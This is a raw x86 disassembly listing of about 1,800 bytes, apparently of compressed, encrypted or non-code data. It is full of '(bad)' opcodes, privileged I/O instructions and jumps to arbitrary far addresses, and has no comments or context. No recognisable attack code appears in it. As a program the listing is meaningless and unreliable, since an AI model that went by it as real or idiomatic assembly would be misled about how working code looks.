  41eaa5:	sbb    BYTE PTR [eax*8+0x783f7afb],al
  41eaac:	push   ds
  41eaad:	or     ebx,DWORD PTR [esi+edi*2]
  41eab0:	ror    DWORD PTR [edi+0x380018df],cl
  41eab6:	xchg   esi,eax
  41eab7:	jo     0x41eb1a
  41eab9:	loopne 0x41ea78
  41eabb:	push   ss
  41eabc:	jle    0x41eaeb
  41eabe:	call   0x88227535
  41eac3:	cli    
  41eac4:	addr16 shl bl,1
  41eac7:	mov    ecx,0x6153471f
  41eacc:	scas   eax,DWORD PTR es:[edi]
  41eacd:	adc    cl,bl
  41eacf:	add    ebp,edi
  41ead1:	xor    eax,0xc7157800
  41ead6:	out    dx,eax
  41ead7:	stc    
  41ead8:	imul   esp,edx,0xffffffde
  41eadb:	ins    BYTE PTR es:[edi],dx
  41eadc:	inc    edx
  41eadd:	(bad)  
  41eade:	jge    0x41ea80
  41eae0:	add    dh,BYTE PTR [edi]
  41eae2:	test   al,0xf8
  41eae4:	popf   
  41eae5:	(bad)  
  41eae6:	sub    ecx,ecx
  41eae8:	fcomp  QWORD PTR [edx-0x62]
  41eaeb:	xlat   BYTE PTR ds:[ebx]
  41eaec:	sbb    cl,BYTE PTR [eax]
  41eaee:	hlt    
  41eaef:	jne    0x41eacf
  41eaf1:	addr16 or al,0x2a
  41eaf4:	mov    edi,0x7baeafae
  41eaf9:	mov    eax,0xc1077ff
  41eafe:	mov    esp,0xfa50f620
  41eb03:	push   0x58fe150
  41eb08:	sub    al,0x2e
  41eb0a:	(bad)  
  41eb0b:	push   esi
  41eb0c:	jbe    0x41eaeb
  41eb0e:	push   cs
  41eb0f:	test   ebp,0x4562d682
  41eb15:	fnsave ds:0xaf3d77de
  41eb1b:	pop    es
  41eb1c:	rol    eax,0xf1
  41eb1f:	xchg   esp,eax
  41eb20:	jecxz  0x41eb59
  41eb22:	stc    
  41eb23:	clc    
  41eb24:	lea    eax,[eax]
  41eb26:	and    BYTE PTR [ebx-0x7],0xb4
  41eb2a:	cmp    dh,al
  41eb2c:	out    0x5a,eax
  41eb2e:	lock cmc 
  41eb30:	sbb    DWORD PTR [ecx],ebx
  41eb32:	cmp    BYTE PTR [ebp-0xfef97ee],dh
  41eb38:	add    al,al
  41eb3a:	mov    al,ds:0x34717500
  41eb3f:	add    esi,eax
  41eb41:	sub    bh,BYTE PTR [ebp+0x0]
  41eb44:	not    DWORD PTR [esi-0x5e]
  41eb47:	mov    ch,0xdc
  41eb49:	or     eax,esp
  41eb4b:	sub    DWORD PTR [ecx],0x9e7fd3bf
  41eb51:	sub    BYTE PTR [eax-0x9909aa],bh
  41eb57:	lods   al,BYTE PTR ds:[esi]
  41eb58:	rep ins BYTE PTR es:[edi],dx
  41eb5a:	hlt    
  41eb5b:	pop    edi
  41eb5c:	mov    bh,0xfb
  41eb5e:	fistp  WORD PTR [ebx-0x62]
  41eb61:	repnz jmp 0x3f56:0xd29069f2
  41eb69:	aam    0xaf
  41eb6b:	scas   eax,DWORD PTR es:[edi]
  41eb6c:	pushf  
  41eb6d:	rol    DWORD PTR [ecx-0x5dfd0f8a],1
  41eb73:	xchg   edi,eax
  41eb74:	or     eax,0x1336b00
  41eb79:	idiv   DWORD PTR [esi-0x22]
  41eb7c:	pop    ds
  41eb7d:	stos   DWORD PTR es:[edi],eax
  41eb7e:	(bad)  
  41eb7f:	(bad)  
  41eb80:	sbb    ch,BYTE PTR [edi+0x59]
  41eb83:	retf   
  41eb84:	retf   0x45af
  41eb87:	repz pop es
  41eb89:	sbb    DWORD PTR [ecx+0x67f5b157],edx
  41eb8f:	xchg   esi,eax
  41eb90:	out    0xaf,eax
  41eb92:	jle    0x41eb41
  41eb94:	rcl    ebx,0xcb
  41eb97:	sahf   
  41eb98:	(bad)  
  41eb99:	add    dh,ch
  41eb9b:	mov    ch,0xfa
  41eb9d:	in     eax,0xff
  41eb9f:	jp     0x41eb26
  41eba1:	icebp  
  41eba2:	sbb    al,0xff
  41eba4:	push   edi
  41eba5:	add    al,BYTE PTR [eax-0x4143a7a9]
  41ebab:	lods   al,BYTE PTR ds:[esi]
  41ebac:	div    esp
  41ebae:	cli    
  41ebaf:	mov    ecx,0xe15e37fa
  41ebb4:	xlat   BYTE PTR ds:[ebx]
  41ebb5:	retf   0x422f
  41ebb8:	pop    ds
  41ebb9:	jecxz  0x41ebd4
  41ebbb:	out    0x99,eax
  41ebbd:	call   0x45118281
  41ebc2:	and    DWORD PTR [ecx+eax*1+0x2],eax
  41ebc6:	std    
  41ebc7:	sti    
  41ebc8:	push   0xcc05a99a
  41ebcd:	sub    edx,DWORD PTR [esi+esi*4-0x19]
  41ebd1:	sbb    DWORD PTR [ebx+0x20bc2cc],eax
  41ebd7:	add    DWORD PTR [edx+0x3ced16be],0xffffffd6
  41ebde:	mov    eax,ds:0xa79e5285
  41ebe3:	sub    eax,0x28bc28be
  41ebe8:	jle    0x41eb7f
  41ebea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebeb:	ins    BYTE PTR es:[edi],dx
  41ebec:	out    0x52,eax
  41ebee:	jmp    0x41eb8f
  41ebf0:	sbb    dl,BYTE PTR [esp+esi*4]
  41ebf3:	nop
  41ebf4:	jnp    0x41ebf7
  41ebf6:	inc    eax
  41ebf7:	add    esp,DWORD PTR [eax-0x2dc06a9]
  41ebfd:	cli    
  41ebfe:	setle  BYTE PTR [ebx+0x620830ed]
  41ec05:	imul   ecx,DWORD PTR [ebp-0x941f397],0xffffffbe
  41ec0c:	xlat   BYTE PTR ds:[ebx]
  41ec0d:	xlat   BYTE PTR ds:[ebx]
  41ec0e:	psadbw mm1,mm7
  41ec11:	mov    cl,0xd8
  41ec13:	sar    DWORD PTR [ebp+0x29],1
  41ec16:	mov    esi,0xca083d7e
  41ec1b:	pop    esi
  41ec1c:	mul    BYTE PTR [ebx-0x67f422eb]
  41ec22:	pop    esi
  41ec23:	(bad)  
  41ec24:	in     al,0xfd
  41ec26:	fcmovnb st,st(1)
  41ec28:	fisubr DWORD PTR [esi]
  41ec2a:	aam    0x5a
  41ec2c:	cmc    
  41ec2d:	clc    
  41ec2e:	dec    ebp
  41ec2f:	call   0xb580:0x5b5f871
  41ec36:	test   al,0xfc
  41ec38:	mov    cl,0x2c
  41ec3a:	std    
  41ec3b:	loopne 0x41ec5d
  41ec3d:	sahf   
  41ec3e:	ja     0x41ec60
  41ec40:	imul   edx,DWORD PTR [eax+0x58],0x35
  41ec44:	std    
  41ec45:	pop    ss
  41ec46:	mov    eax,ds:0x8517c116
  41ec4b:	dec    edi
  41ec4c:	repnz dec esp
  41ec4e:	test   DWORD PTR [edi+0x79],0x2e7fef1d
  41ec55:	fild   WORD PTR [edi]
  41ec57:	sti    
  41ec58:	not    DWORD PTR [edx-0x42d50dba]
  41ec5e:	push   edi
  41ec5f:	mov    al,0x6
  41ec61:	add    eax,eax
  41ec63:	retf   
  41ec64:	cs in  al,0x39
  41ec67:	scas   eax,DWORD PTR es:[edi]
  41ec68:	int    0xf6
  41ec6a:	mov    esi,0xd5615aff
  41ec6f:	jmp    0x13b7:0xf700ba0d
  41ec76:	mov    ds:0x3cf2feb6,eax
  41ec7b:	push   ecx
  41ec7c:	outs   dx,BYTE PTR ds:[esi]
  41ec7d:	push   ecx
  41ec7e:	jle    0x41ecd1
  41ec80:	test   BYTE PTR [edx],0xcf
  41ec83:	and    cl,bh
  41ec85:	jl     0x41ec86
  41ec87:	scas   eax,DWORD PTR es:[edi]
  41ec88:	mov    esp,0xd7bff6af
  41ec8d:	ret    0x29ad
  41ec90:	scas   al,BYTE PTR es:[edi]
  41ec91:	outs   dx,BYTE PTR ds:[esi]
  41ec92:	das    
  41ec93:	pop    ebp
  41ec94:	inc    esi
  41ec95:	fld    QWORD PTR [esi]
  41ec97:	icebp  
  41ec98:	jle    0x41ec57
  41ec9a:	push   ebx
  41ec9b:	add    ebp,ebp
  41ec9d:	mov    al,ds:0x6cbd101
  41eca2:	push   es
  41eca3:	inc    ecx
  41eca4:	pusha  
  41eca5:	lock pop eax
  41eca7:	retf   
  41eca8:	mov    ch,0x19
  41ecaa:	in     al,dx
  41ecab:	push   edi
  41ecac:	outs   dx,DWORD PTR ds:[esi]
  41ecad:	mov    edi,0xf461ebc9
  41ecb2:	rol    dh,0xf1
  41ecb5:	fdivr  QWORD PTR [edi+0x19]
  41ecb8:	cmp    eax,0xab3fbb70
  41ecbd:	aas    
  41ecbe:	test   al,0xfc
  41ecc0:	and    DWORD PTR [edi-0xa93efa],0xffffffd4
  41ecc7:	loopne 0x41eca1
  41ecc9:	lock pushf 
  41eccb:	dec    ebp
  41eccc:	lods   al,BYTE PTR ds:[esi]
  41eccd:	mov    edx,0x82ac1d50
  41ecd2:	add    BYTE PTR [ebx-0x42236a4b],0x8f
  41ecd9:	adc    edi,eax
  41ecdb:	xor    eax,0x1c63a855
  41ece0:	mov    edi,0x40f00036
  41ece5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ece6:	out    0x8e,eax
  41ece8:	gs in  eax,dx
  41ecea:	mov    ebp,0x24707694
  41ecef:	pop    ebx
  41ecf0:	dec    esi
  41ecf1:	scas   eax,DWORD PTR es:[edi]
  41ecf2:	aas    
  41ecf3:	daa    
  41ecf4:	fild   QWORD PTR [ecx-0x61]
  41ecf7:	xlat   BYTE PTR ds:[ebx]
  41ecf8:	stos   DWORD PTR es:[edi],eax
  41ecf9:	cld    
  41ecfa:	mov    edi,0x6ce1f41b
  41ecff:	retf   
  41ed00:	inc    ebp
  41ed01:	nop
  41ed02:	jg     0x41ed5b
  41ed04:	js     0x41ed29
  41ed06:	lahf   
  41ed07:	dec    edi
  41ed08:	scas   al,BYTE PTR es:[edi]
  41ed09:	xor    eax,esp
  41ed0b:	push   edx
  41ed0c:	sbb    ch,BYTE PTR [ebx+ebx*8-0x7b]
  41ed10:	popa   
  41ed11:	sbb    cl,al
  41ed13:	inc    ebp
  41ed14:	or     eax,0xd2aefc18
  41ed19:	jno    0x41ed3c
  41ed1b:	cdq    
  41ed1c:	adc    al,0xa6
  41ed1e:	retf   0xbaae
  41ed21:	fbstp  TBYTE PTR [ebx+0x33]
  41ed24:	dec    ecx
  41ed25:	cld    
  41ed26:	ror    DWORD PTR [edx-0x2],0x9e
  41ed2a:	jnp    0x41eceb
  41ed2c:	cmp    al,0xd3
  41ed2e:	jg     0x41ed90
  41ed30:	fistp  QWORD PTR [edi+0x68]
  41ed33:	ror    DWORD PTR [esi+0x490396da],cl
  41ed39:	mov    ebp,0xe05e218
  41ed3e:	aas    
  41ed3f:	xor    edi,DWORD PTR [ebp+0x26]
  41ed42:	in     al,0xd7
  41ed44:	int    0xae
  41ed46:	adc    DWORD PTR ds:0x88f6c6d3,0xffffffd5
  41ed4d:	sub    esp,DWORD PTR [eax-0x4b]
  41ed50:	pop    edi
  41ed51:	dec    eax
  41ed52:	push   ss
  41ed53:	in     al,dx
  41ed54:	test   BYTE PTR [edx+0x10],0xf5
  41ed58:	scas   al,BYTE PTR es:[edi]
  41ed59:	mov    ebp,DWORD PTR [ecx]
  41ed5b:	xchg   esi,eax
  41ed5c:	sub    edx,ecx
  41ed5e:	jmp    0x41ed4b
  41ed60:	mov    esp,0x265f8047
  41ed65:	add    esp,DWORD PTR [esi-0x746ab946]
  41ed6b:	mov    edi,0xde2e3ae9
  41ed70:	pop    eax
  41ed71:	imul   ebp,DWORD PTR [eax],0xffffffa5
  41ed74:	and    esi,eax
  41ed76:	mov    al,ds:0x10105584
  41ed7b:	loope  0x41ed33
  41ed7d:	mov    al,0xa
  41ed7f:	add    BYTE PTR [esi+0x6],bl
  41ed82:	in     al,0x5
  41ed84:	shl    bh,0x1b
  41ed87:	push   es
  41ed88:	fsubp  st(7),st
  41ed8a:	imul   DWORD PTR [edi-0x254e6bca]
  41ed90:	jp     0x41eddc
  41ed92:	mov    eax,0xa865795d
  41ed97:	out    0xf6,eax
  41ed99:	fcomp  QWORD PTR [esi]
  41ed9b:	add    ecx,DWORD PTR ds:0x164987e
  41eda1:	jl     0x41edcf
  41eda3:	mov    ds:0xdf9eba69,eax
  41eda8:	loop   0x41ed92
  41edaa:	xlat   BYTE PTR ds:[ebx]
  41edab:	sub    al,0x1f
  41edad:	int3   
  41edae:	push   ebp
  41edaf:	or     dh,bh
  41edb1:	scas   eax,DWORD PTR es:[edi]
  41edb2:	icebp  
  41edb3:	sub    BYTE PTR [esi-0x2bcdd2b7],al
  41edb9:	mov    dl,0xa1
  41edbb:	and    edx,DWORD PTR ds:0x9afbf824
  41edc1:	fld    TBYTE PTR [ebx+0x51cf22f6]
  41edc7:	sahf   
  41edc8:	mov    dl,0x6d
  41edca:	lea    esi,[ebx+eiz*8]
  41edcd:	and    BYTE PTR es:[edi-0x75],0x3f
  41edd2:	cmc    
  41edd3:	repz cli 
  41edd5:	xor    BYTE PTR [edi+ebx*2-0x81e9f72],0xe1
  41eddd:	cli    
  41edde:	sbb    DWORD PTR [ebx],ebx
  41ede0:	cmp    DWORD PTR [esi],edx
  41ede2:	jle    0x41ee5f
  41ede4:	xor    al,BYTE PTR [ebx+eax*8-0x32f1c95b]
  41edeb:	repz xor eax,0x59a8a07a
  41edf1:	xchg   edx,eax
  41edf2:	xlat   BYTE PTR ds:[ebx]
  41edf3:	dec    ebp
  41edf4:	shr    BYTE PTR [ebp+0x51],cl
  41edf7:	out    dx,eax
  41edf8:	lahf   
  41edf9:	call   0x20bd:0xeffb552d
  41ee00:	mov    al,ds:0x2d7e81
  41ee05:	pop    eax
  41ee06:	imul   esi,DWORD PTR [esi+0x61],0xffffffad
  41ee0a:	cdq    
  41ee0b:	pop    ss
  41ee0c:	loopne 0x41ede5
  41ee0e:	inc    esp
  41ee0f:	mov    cl,0xee
  41ee11:	out    0x38,eax
  41ee13:	out    dx,al
  41ee14:	add    BYTE PTR [eax],dh
  41ee16:	cmp    BYTE PTR [eax],ah
  41ee18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee19:	xchg   ebp,eax
  41ee1a:	fdiv   QWORD PTR [edi-0x55c7c63a]
  41ee20:	out    dx,al
  41ee21:	sbb    eax,0xdbb4d36c
  41ee26:	jnp    0x41edd5
  41ee28:	mov    esi,0x185ad7b7
  41ee2d:	std    
  41ee2e:	jmp    0x41edb4
  41ee30:	fimul  DWORD PTR [edx+0x17e513e5]
  41ee36:	add    edi,ebp
  41ee38:	fdivp  st(6),st
  41ee3a:	out    dx,eax
  41ee3b:	or     al,0xd3
  41ee3d:	(bad)  
  41ee3e:	fdivrp st(1),st
  41ee40:	or     dl,dl
  41ee42:	jb     0x41ee05
  41ee44:	xchg   edx,eax
  41ee45:	sbb    ebp,0xfffffffc
  41ee48:	test   DWORD PTR [eax],ecx
  41ee4a:	loopne 0x41ee74
  41ee4c:	add    eax,0x30309e38
  41ee51:	out    0xfa,eax
  41ee53:	jno    0x41ede0
  41ee55:	arpl   WORD PTR gs:[edx-0x6a75003e],dx
  41ee5c:	xchg   esi,eax
  41ee5d:	mov    edx,0xeace35df
  41ee62:	mov    cs,WORD PTR [edx+0x17]
  41ee65:	gs push edi
  41ee67:	pop    ebx
  41ee68:	hlt    
  41ee69:	push   es
  41ee6a:	push   0xffffffe2
  41ee6c:	fisttp WORD PTR [edi-0x62]
  41ee6f:	cmp    DWORD PTR [edx+0x45b5c36d],0x5db45c91
  41ee79:	pop    es
  41ee7a:	popa   
  41ee7b:	pop    edi
  41ee7c:	dec    edi
  41ee7d:	sar    DWORD PTR [esi-0x1e78129a],1
  41ee83:	mov    BYTE PTR [edx],ah
  41ee85:	mov    dh,0x7b
  41ee87:	shr    BYTE PTR [eax],cl
  41ee89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8a:	mov    al,0xd6
  41ee8c:	das    
  41ee8d:	sbb    al,0xb
  41ee8f:	cmp    DWORD PTR [ebp+0xc],ebx
  41ee92:	mov    cl,0x4c
  41ee94:	rol    BYTE PTR es:[ecx-0x2f],cl
  41ee98:	inc    edi
  41ee99:	adc    edx,esp
  41ee9b:	ja     0x41eef1
  41ee9d:	pop    ecx
  41ee9e:	or     DWORD PTR [edi],ebx
  41eea0:	inc    esi
  41eea2:	cld    
  41eea3:	es dec esp
  41eea5:	(bad)  
  41eea6:	mov    dh,0x16
  41eea8:	mov    cl,0x11
  41eeaa:	and    DWORD PTR [eax],edx
  41eeac:	std    
  41eead:	jne    0x41ee52
  41eeaf:	mov    DWORD PTR [ecx+0x29],edi
  41eeb2:	xor    bh,BYTE PTR [edx+0x20]
  41eeb5:	mov    al,ds:0xfc11025d
  41eeba:	mov    fs,WORD PTR [edi-0x5005a112]
  41eec0:	lods   eax,DWORD PTR ds:[esi]
  41eec1:	mov    edi,0x9e11fe58
  41eec6:	fisttp WORD PTR [ecx]
  41eec8:	add    al,0x21
  41eeca:	mov    al,0x74
  41eecc:	pop    edx
  41eece:	mov    edx,0x5de0a93c
  41eed3:	(bad)  
  41eed4:	mov    dl,0xce
  41eed6:	iret   
  41eed7:	or     eax,DWORD PTR [eax*4+0x2cc0c840]
  41eede:	mov    edi,0xb4608abf
  41eee3:	and    eax,0x7e16c3e0
  41eee8:	ds int3 
  41eeea:	jb     0x41eea0
  41eeec:	js     0x41ee88
  41eeee:	cld    
  41eeef:	jl     0x41ef49
  41eef1:	mov    al,0x89
  41eef3:	mov    edi,0x4189f38b
  41eef8:	(bad)  
  41eef9:	xchg   ebp,eax
  41eefa:	addr16 (bad) 
  41eefc:	ss jne 0x41eee0
  41eeff:	arpl   WORD PTR [ecx],ax
  41ef01:	test   al,0xb7
  41ef03:	jo     0x41eefd
  41ef05:	mov    bh,0xbe
  41ef07:	and    ch,BYTE PTR [eax]
  41ef09:	loop   0x41ef6b
  41ef0b:	into   
  41ef0c:	div    cl
  41ef0e:	(bad)  
  41ef0f:	(bad)  
  41ef10:	int    0x76
  41ef12:	scas   eax,DWORD PTR es:[edi]
  41ef13:	dec    edi
  41ef14:	add    al,0xc0
  41ef16:	out    dx,al
  41ef17:	loopne 0x41ef52
  41ef19:	shr    edi,1
  41ef1b:	mov    bl,0xe1
  41ef1d:	jle    0x41ef58
  41ef1f:	dec    ebp
  41ef20:	push   ss
  41ef21:	mov    eax,0x1581edd4
  41ef26:	xabort 0x7e
  41ef29:	pop    ecx
  41ef2a:	sahf   
  41ef2b:	addr16 mov al,0x1d
  41ef2e:	or     BYTE PTR [esp+edi*4],bh
  41ef31:	loopne 0x41ef19
  41ef33:	scas   al,BYTE PTR es:[edi]
  41ef34:	lahf   
  41ef35:	mov    al,ds:0xb634e2e1
  41ef3a:	repz das 
  41ef3c:	js     0x41ef07
  41ef3e:	inc    esi
  41ef3f:	hlt    
  41ef40:	sbb    BYTE PTR [ebp+0x1445b6fc],al
  41ef46:	cdq    
  41ef47:	or     ebx,DWORD PTR [edx+0x613355d8]
  41ef4d:	aam    0xbb
  41ef4f:	stos   BYTE PTR es:[edi],al
  41ef50:	dec    ebp
  41ef51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef52:	ins    DWORD PTR es:[edi],dx
  41ef53:	inc    esp
  41ef54:	icebp  
  41ef55:	sub    edi,ebp
  41ef57:	xlat   BYTE PTR ds:[ebx]
  41ef58:	add    bl,BYTE PTR [eax+0x5fc81d9a]
  41ef5e:	scas   eax,DWORD PTR es:[edi]
  41ef5f:	sub    esp,DWORD PTR [eax+0x6166b58f]
  41ef65:	(bad)  
  41ef66:	sbb    dl,BYTE PTR [eax+0x1c]
  41ef69:	sbb    al,0x4c
  41ef6b:	add    al,0x7e
  41ef6d:	mov    ebp,0x2b8e081
  41ef72:	shl    BYTE PTR [eax],0x1d
  41ef75:	sbb    al,0xb4
  41ef77:	out    0x81,al
  41ef79:	arpl   WORD PTR [esi+ebx*2+0x382f0a6b],di
  41ef80:	lock mov ebp,0xe74908d7
  41ef86:	mov    ah,0xfb
  41ef88:	ret    0xf6e7
  41ef8b:	scas   eax,DWORD PTR es:[edi]
  41ef8c:	rol    DWORD PTR [eax],1
  41ef8e:	and    BYTE PTR [esi+0x66],dl
  41ef91:	mov    bh,ah
  41ef93:	lds    edx,FWORD PTR [esi+ebp*8]
  41ef96:	jb     0x41efbc
  41ef98:	mov    WORD PTR [ebx+esi*4-0x7b],ss
  41ef9c:	push   edi
  41ef9d:	push   cs
  41ef9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef9f:	push   eax
  41efa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa1:	loopne 0x41efea
  41efa3:	add    eax,DWORD PTR [ecx]
  41efa5:	pop    edx
  41efa6:	pop    esi
  41efa7:	sub    dl,BYTE PTR [ecx-0x55]
  41efaa:	ret    
  41efab:	fist   WORD PTR [eax-0x58]
  41efae:	test   eax,0x819f6114
  41efb3:	dec    edx
  41efb4:	retf   
  41efb5:	(bad)  
  41efb6:	dec    ebx
  41efb7:	and    bh,BYTE PTR [esi]
  41efb9:	mov    esp,0x9d8abe74
  41efbe:	sahf   
  41efbf:	in     eax,dx
  41efc0:	aam    0xe4
  41efc2:	fimul  WORD PTR [edi-0x15]
  41efc5:	pop    ebx
  41efc6:	jmp    FWORD PTR [edi+0x68f8fd54]
  41efcc:	jb     0x41efe1
  41efce:	jb     0x41efb1
  41efd0:	xor    BYTE PTR [edx+0x5d],bl
  41efd3:	pop    ebx
  41efd4:	cdq    
  41efd5:	shr    BYTE PTR [edx-0x489e5e9b],1
  41efdb:	xchg   ecx,eax
  41efdc:	or     eax,DWORD PTR [ebp+0x64]
  41efdf:	(bad)  
  41efe0:	ss mov esp,0x4bc4573e
  41efe6:	aaa    
  41efe7:	sbb    BYTE PTR [eax+0x56],dh
  41efea:	call   0x3d38:0x8d0cf008
  41eff1:	sub    eax,0xeb4a37e8
  41eff6:	mov    esp,0xd5ee78ed
  41effb:	or     edx,DWORD PTR [eax+0x7887da9d]
  41f001:	std    
  41f002:	or     DWORD PTR [ecx+eax*1+0x79],esp
  41f006:	sub    cl,dh
  41f008:	jecxz  0x41f002
  41f00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00b:	int    0xbc
  41f00d:	out    0x54,al
  41f00f:	xor    al,BYTE PTR [ecx+0x448ba040]
  41f015:	(bad)
  41f018:	stos   DWORD PTR es:[edi],eax
  41f019:	or     eax,0xb267f0cc
  41f01e:	div    DWORD PTR [ebx-0x4525fd9a]
  41f024:	imul   ebx,DWORD PTR [edx-0x15],0xd5605
  41f02b:	inc    edx
  41f02c:	repz add eax,0x95586800
  41f032:	loop   0x41f0b1
  41f034:	(bad)  
  41f035:	pop    ds
  41f036:	pusha  
  41f037:	pop    ebp
  41f038:	pop    ebp
  41f039:	inc    ecx
  41f03a:	inc    edx
  41f03b:	je     0x41f036
  41f03d:	int3   
  41f03e:	(bad)  
  41f040:	cmp    DWORD PTR ds:0xa6eedb91,eax
  41f046:	je     0x41efff
  41f048:	popa   
  41f049:	fldenv [esi]
  41f04b:	push   ss
  41f04c:	fwait
  41f04d:	add    esp,ebx
  41f04f:	fidiv  WORD PTR [ecx-0x1f26a4f]
  41f055:	mov    bl,0x6e
  41f057:	or     BYTE PTR [ecx+0x22],ch
  41f05a:	fsubr  DWORD PTR [ecx+ebx*4]
  41f05d:	push   ebx
  41f05e:	xchg   ebx,eax
  41f05f:	ja     0x41f0c0
  41f061:	mov    eax,ds:0xf90d1f25
  41f066:	push   eax
  41f067:	adc    BYTE PTR es:[eax+edi*8],ah
  41f06b:	nop
  41f06c:	or     ch,bl
  41f06e:	cld    
  41f06f:	jno    0x41f024
  41f071:	or     eax,0x14c2c13f
  41f076:	cmc    
  41f077:	adc    ch,ch
  41f079:	sbb    esp,DWORD PTR [edi-0x43]
  41f07c:	js     0x41f01d
  41f07e:	push   ss
  41f07f:	shl    DWORD PTR ds:0x7d4542cf,0x21
  41f086:	test   BYTE PTR [eax-0x29],bl
  41f089:	(bad)  ss:[esi-0x1da17533]
  41f090:	test   BYTE PTR [eax-0x14],0x77
  41f094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f095:	mov    esp,0x8d443153
  41f09a:	cmp    bh,BYTE PTR [ebx+esi*4-0x40]
  41f09e:	ds push esi
  41f0a0:	bound  eax,QWORD PTR [edi+0x4b552180]
  41f0a6:	xor    dh,dl
  41f0a8:	fimul  DWORD PTR [edx-0x3b]
  41f0ab:	out    0x85,al
  41f0ad:	xchg   ebp,eax
  41f0ae:	loope  0x41f0b8
  41f0b0:	outs   dx,BYTE PTR ds:[esi]
  41f0b1:	popf   
  41f0b2:	mul    ecx
  41f0b4:	pushf  
  41f0b5:	je     0x41f0bf
  41f0b7:	fwait
  41f0b8:	xchg   edi,eax
  41f0b9:	dec    edx
  41f0ba:	cmp    BYTE PTR [eax+0x10],cl
  41f0bd:	fcomp  st(4)
  41f0bf:	scas   eax,DWORD PTR es:[edi]
  41f0c0:	mov    bl,0x4b
  41f0c2:	add    al,0xc9
  41f0c4:	adc    DWORD PTR [eax],esi
  41f0c6:	cmp    cl,BYTE PTR [ebp+0x55]
  41f0c9:	jl     0x41f0c3
  41f0cb:	fstp   QWORD PTR [esi-0x65]
  41f0ce:	in     al,dx
  41f0cf:	je     0x41f0d3
  41f0d1:	fsubr  st,st(3)
  41f0d3:	cwde   
  41f0d4:	cmp    BYTE PTR [edi-0x20d84783],cl
  41f0da:	shr    BYTE PTR ds:0x13b1d595,0x93
  41f0e1:	std    
  41f0e2:	pop    ebx
  41f0e3:	(bad)  
  41f0e4:	stc    
  41f0e5:	cmp    ebp,esi
  41f0e7:	stos   BYTE PTR es:[edi],al
  41f0e8:	and    bh,BYTE PTR [ebx-0x5]
  41f0eb:	ja     0x41f13d
  41f0ed:	jmp    0x753f7f9
  41f0f2:	pop    es
  41f0f3:	pop    esi
  41f0f4:	out    dx,eax
  41f0f5:	imul   esi,DWORD PTR [eax],0xfffffff1
  41f0f8:	xlat   BYTE PTR ds:[ebx]
  41f0f9:	loope  0x41f133
  41f0fb:	outs   dx,BYTE PTR ds:[esi]
  41f0fc:	add    BYTE PTR [eax+0x77bc9cd6],dh
  41f102:	lock int3 
  41f104:	jmp    0x41f149
  41f106:	jmp    0x41f0df
  41f108:	add    DWORD PTR [edi*1-0x72c7c8bb],ebx
  41f10f:	in     eax,0xfd
  41f111:	pop    esp
  41f112:	pop    ds
  41f113:	rcl    BYTE PTR [ecx],cl
  41f115:	pop    ds
  41f116:	test   DWORD PTR ds:0x85a8c1f0,0x7bded5dd
  41f120:	mov    bl,0x7f
  41f122:	mov    ebp,0x93088000
  41f127:	pop    eax
  41f128:	mov    edi,0x76fb0a49
  41f12d:	sub    bh,BYTE PTR [esp+ebx*4-0x7b]
  41f131:	jp     0x41f178
  41f133:	mov    DWORD PTR ss:[ebp*4+0x37a8ab9b],ecx
  41f13b:	retf   
  41f13c:	fnstenv [eax-0x2e968ab8]
  41f142:	sub    BYTE PTR [ebx+eiz*8],bl
  41f145:	xor    al,0x63
  41f147:	dec    esi
  41f148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f149:	xor    DWORD PTR [ebx-0x73],0x0
  41f14d:	push   ds
  41f14e:	push   edi
  41f14f:	lods   al,BYTE PTR ds:[esi]
  41f150:	pusha  
  41f151:	ja     0x41f10c
  41f153:	lea    ecx,[ebx+0x2a3ff4a8]
  41f159:	imul   BYTE PTR [edi+edi*8+0x3604b539]
  41f160:	xchg   BYTE PTR ds:0xdff0a06c,cl
  41f166:	adc    al,0x1c
  41f168:	inc    edx
  41f169:	xchg   esi,eax
  41f16a:	retf   0xc57e
  41f16d:	fcomp  QWORD PTR [ebp-0x75986b09]
  41f173:	out    0x6f,eax
  41f175:	push   ecx
  41f176:	xor    BYTE PTR [ebx],dl
  41f178:	mov    ecx,0x1c89622c
  41f17d:	push   cs
  41f17e:	push   ebp
  41f17f:	sbb    eax,0x7c4d5a64
  41f184:	mov    ah,0x3e
  41f186:	xchg   DWORD PTR [ebx-0x43439ebd],ebp
  41f18c:	fist   DWORD PTR [edx-0x6e]
  41f18f:	aad    0x6e
  41f191:	test   eax,esi
  41f193:	mov    ds:0x4730460,al
  41f198:	lahf   
  41f199:	adc    DWORD PTR [esi-0x6074b4dd],edx
  41f19f:	in     al,0xf3
  41f1a1:	sub    DWORD PTR [esi-0x22c096f1],0x11
  41f1a8:	neg    dl
  41f1aa:	fstp   DWORD PTR [ebp+0x6d75ce2e]
  41f1b0:	cwde   
  41f1b1:	in     eax,dx
  41f1b2:	cs (bad) 
  41f1b4:	mov    ch,0xde
  41f1b6:	les    esi,FWORD PTR [edi+ebp*8]
  41f1b9:	dec    ebp
  41f1ba:	pop    ebp
  41f1bb:	push   ecx
  41f1bc:	or     dh,BYTE PTR [edx+eax*4-0x385fe9ab]
  41f1c3:	add    DWORD PTR [esi],eax
  41f1c5:	mov    DWORD PTR [eax],0xda400cbc
  41f1cb:	inc    ecx
  41f1cc:	test   al,0xf7
  41f1ce:	and    al,0xcf
  41f1d0:	not    DWORD PTR [ecx+0x760804a1]
  41f1d6:	mov    ch,0x3f
  41f1d8:	fimul  WORD PTR [esi-0x7fc3126]
  41f1de:	repz fldenv [eax]
  41f1e1:	and    BYTE PTR [eax+edi*8-0x73b07ddb],0x20
  41f1e9:	xchg   esp,eax
  41f1ea:	lock cmc 
  41f1ec:	sub    al,0xfb
  41f1ee:	das    
  41f1ef:	fwait
  41f1f0:	push   ss
  41f1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1f2:	inc    edx
  41f1f3:	inc    ecx
  41f1f4:	pop    eax
  41f1f5:	lods   al,BYTE PTR ds:[esi]
